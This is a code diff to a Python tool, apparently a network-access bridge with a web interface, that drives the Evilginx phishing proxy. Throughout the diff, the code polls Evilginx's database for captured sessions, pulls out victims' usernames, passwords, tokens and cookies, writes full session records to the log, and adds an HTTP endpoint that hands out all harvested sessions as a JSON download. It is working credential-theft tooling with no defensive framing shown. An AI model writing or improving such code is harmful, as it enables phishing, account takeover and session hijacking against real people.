@@ -982,6 +982,8 @@ phishlets enable {phishlet}
     
     def _monitor_sessions(self):
         """Monitor Evilginx database for captured sessions"""
+        first_check = True
+        
         while not self.stop_monitoring:
             try:
                 # Try multiple database locations
@@ -989,13 +991,16 @@ phishlets enable {phishlet}
                     self.db_path,
                     os.path.expanduser('~/.evilginx/data.db'),
                     os.path.join(self.config_dir, 'data.db'),
-                    '/root/.evilginx/data.db'
+                    '/root/.evilginx/data.db',
+                    '/opt/evilginx/.evilginx/data.db'
                 ]
                 
                 db_found = None
                 for db in db_paths:
                     if os.path.exists(db):
                         db_found = db
+                        if first_check:
+                            log(f"Found Evilginx database: {db_found}", 'INFO')
                         break
                 
                 if db_found:
@@ -1008,26 +1013,43 @@ phishlets enable {phishlet}
                         cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
                         tables = [row[0] for row in cursor.fetchall()]
                         
+                        if first_check:
+                            log(f"Database tables: {', '.join(tables)}", 'INFO')
+                        
                         if 'sessions' in tables:
-                            # Get all captured sessions
+                            # Get column names
+                            cursor.execute("PRAGMA table_info(sessions)")
+                            table_info = cursor.fetchall()
+                            columns = [col[1] for col in table_info]
+                            
+                            if first_check:
+                                log(f"Session columns: {', '.join(columns)}", 'INFO')
+                            
+                            # Get ALL sessions (not just captured ones)
                             cursor.execute("SELECT * FROM sessions")
-                            columns = [description[0] for description in cursor.description]
+                            column_names = [description[0] for description in cursor.description]
                             rows = cursor.fetchall()
+                            
+                            if first_check and rows:
+                                log(f"Found {len(rows)} session(s) in database", 'INFO')
                             
                             new_sessions = []
                             for row in rows:
                                 # Build session dict from columns
-                                session_dict = dict(zip(columns, row))
+                                session_dict = dict(zip(column_names, row))
                                 
-                                # Extract key fields
+                                if first_check:
+                                    log(f"Session data: {session_dict}", 'INFO')
+                                
+                                # Extract key fields (adapt to actual schema)
                                 session = {
                                     'id': session_dict.get('id'),
                                     'phishlet': session_dict.get('phishlet', 'unknown'),
-                                    'username': session_dict.get('username', ''),
+                                    'username': session_dict.get('username', session_dict.get('login', '')),
                                     'password': session_dict.get('password', ''),
-                                    'tokens': session_dict.get('tokens', ''),
-                                    'cookies': session_dict.get('custom', ''),  # cookies might be in 'custom' field
-                                    'captured_at': session_dict.get('update_time', ''),
+                                    'tokens': session_dict.get('tokens', session_dict.get('custom', '')),
+                                    'cookies': session_dict.get('cookies', session_dict.get('custom', '')),
+                                    'captured_at': session_dict.get('update_time', session_dict.get('create_time', '')),
                                     'timestamp': datetime.now().isoformat(),
                                     'raw': str(session_dict)
                                 }
@@ -1035,21 +1057,28 @@ phishlets enable {phishlet}
                                 # Check if new
                                 if not any(s.get('id') == session['id'] for s in self.sessions):
                                     new_sessions.append(session)
-                                    log(f"NEW SESSION CAPTURED! User: {session['username']}", 'SUCCESS')
+                                    log(f"NEW SESSION CAPTURED!", 'SUCCESS')
+                                    log(f"  ID: {session['id']}", 'SUCCESS')
+                                    log(f"  Phishlet: {session['phishlet']}", 'SUCCESS')
+                                    log(f"  Username: {session['username']}", 'SUCCESS')
                             
                             if new_sessions:
                                 self.sessions.extend(new_sessions)
                                 self._save_sessions()
                         else:
-                            log(f"No sessions table in database. Tables: {tables}", 'WARNING')
+                            if first_check:
+                                log(f"No sessions table found. Available tables: {tables}", 'WARNING')
                         
                         conn.close()
                     except Exception as e:
                         log(f"Session parsing error: {e}", 'ERROR')
+                        import traceback
+                        log(traceback.format_exc(), 'ERROR')
                 else:
-                    # Database doesn't exist yet - this is normal before first capture
-                    pass
+                    if first_check:
+                        log(f"Evilginx database not found. Checked: {db_paths}", 'WARNING')
                 
+                first_check = False
                 time.sleep(5)
                 
             except Exception as e:
@@ -1856,6 +1885,15 @@ class NACWebHandler(BaseHTTPRequestHandler):
             else:
                 self.send_error(404)
         
+        # Evilginx session export (GET request for download)
+        elif path == '/api/evilginx/sessions':
+            sessions = self.bridge_manager.evilginx_manager.sessions
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.send_header('Content-Disposition', 'attachment; filename="evilginx_sessions.json"')
+            self.end_headers()
+            self.wfile.write(json.dumps(sessions, indent=2).encode('utf-8'))
+        
         # Test page for debugging
         elif path == '/test':
             try:
@@ -2015,15 +2053,6 @@ class NACWebHandler(BaseHTTPRequestHandler):
         elif path == '/api/evilginx/stop':
             success = self.bridge_manager.evilginx_manager.stop()
             self._send_json({'success': success})
-            
-        elif path == '/api/evilginx/sessions':
-            # Export sessions as JSON file download
-            sessions = self.bridge_manager.evilginx_manager.sessions
-            self.send_response(200)
-            self.send_header('Content-Type', 'application/json')
-            self.send_header('Content-Disposition', 'attachment; filename="evilginx_sessions.json"')
-            self.end_headers()
-            self.wfile.write(json.dumps(sessions, indent=2).encode('utf-8'))
             
         elif path == '/api/evilginx/clear_sessions':
             self.bridge_manager.evilginx_manager.clear_sessions()
